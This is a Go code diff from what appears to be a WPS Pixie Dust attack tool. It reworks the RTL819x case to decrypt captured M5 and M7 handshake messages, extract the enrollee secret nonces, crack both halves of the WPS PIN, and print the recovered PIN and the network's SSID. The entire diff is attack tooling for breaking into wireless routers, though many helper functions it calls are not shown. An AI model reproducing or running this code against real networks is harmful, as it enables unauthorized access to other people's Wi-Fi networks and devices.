@@ -21,8 +21,6 @@ import (
 	"bytes"
 	"crypto/aes"
 	"crypto/cipher"
-	"crypto/hmac"
-	"crypto/sha256"
 	"encoding/binary"
 	"errors"
 	"fmt"
@@ -34,6 +32,7 @@ import (
 const (
     wpsTagESecretNonce1 = 0x1016
     wpsTagESecretNonce2 = 0x1017
+	wpsTagSSID          = 0x1045
 )
 
 
@@ -42,24 +41,20 @@ func (pda *pixieDustAttack) executeRTL819xCase() {
 	if len(pda.m7enc) == 0 { return }
 	pda.rtl819xReqFlags()
 	pda.isRTL819xPKE()
+	pda.keyDerivationFunction()
+	pda.decryptM7()
+	pda.decryptM5()
 
-	dhKey := computeDHKey(pda.pkr)
-	
-	h := hmac.New(sha256.New, dhKey)
-	h.Write(append(append(pda.eNonce, pda.ebssid...), pda.rNonce...))
-	kdk := h.Sum(nil)
+	if pda.hasAllRTLdata() {
+		pda.emptyPinHMAC()
+		pda.findESecrets()
+		pda.crackFirstHalf([]byte{})
+		pda.crackSecondHalf()
+	}
 
-	pda.keyDerivationFunction(kdk)
-
-	decrypted7 := pda.decryptEncryptedSettings(pda.m7enc)
-	pda.m7enc   = nil
-
-	decrypted5 := pda.decryptEncryptedSettings(pda.m5enc)
-	pda.m5enc   = nil
-
-	pda.emptyPinHMAC()
-	pda.findESecrets(decrypted5, decrypted7)
-	pda.crackFirstHalf([]byte{})
+	pda.displayTime()
+	pda.displaySSIDFromM7()
+	pda.displayPIN()
 }
 
 
@@ -139,6 +134,19 @@ func (pda *pixieDustAttack) decryptEncryptedSettings(encr []byte) []byte {
 }
 
 
+func (pda *pixieDustAttack) decryptM5() {
+	pda.decrypted5 = pda.decryptEncryptedSettings(pda.m5enc)
+	pda.m5enc      = nil
+}
+
+
+
+func (pda *pixieDustAttack) decryptM7() {
+	pda.decrypted7 = pda.decryptEncryptedSettings(pda.m7enc)
+	pda.m7enc      = nil
+}
+
+
 
 func findVTag(data []byte, targetID uint16, targetLen int) ([]byte, error) {
     for i := 0; i+4 <= len(data); {
@@ -161,9 +169,20 @@ func findVTag(data []byte, targetID uint16, targetLen int) ([]byte, error) {
 
 
 
-func (pda *pixieDustAttack) findESecrets(decrypted5, decrypted7 []byte) {
-	pda.eSecret1 = extractSecret(decrypted5, wpsTagESecretNonce1, "E-SNONCE 1")
-	pda.eSecret2 = extractSecret(decrypted7, wpsTagESecretNonce2, "E-SNONCE 2")
+func (pda *pixieDustAttack) hasAllRTLdata() bool {
+	ok := pda.decrypted5 != nil
+	ok  = ok && pda.decrypted7 != nil
+	ok  = ok && pda.eHash1 != nil
+	ok  = ok && pda.eHash2 != nil
+	
+	return ok
+}
+
+
+
+func (pda *pixieDustAttack) findESecrets() {
+	pda.eSecret1 = extractSecret(pda.decrypted5, wpsTagESecretNonce1, "E-SNONCE 1")
+	pda.eSecret2 = extractSecret(pda.decrypted7, wpsTagESecretNonce2, "E-SNONCE 2")
 }
 
 
@@ -176,4 +195,15 @@ func extractSecret(data []byte, tagID uint16, fieldName string) []byte {
     }
 
     return secret
+}
+
+
+
+func (pda *pixieDustAttack) displaySSIDFromM7() {
+	ssidTag, err := findVTag(pda.decrypted7, wpsTagSSID, 0)
+	
+	if err == nil {
+	    ssid := string(ssidTag)
+	    fmt.Printf("[*] SSID: %s\n", ssid)
+	}
 }
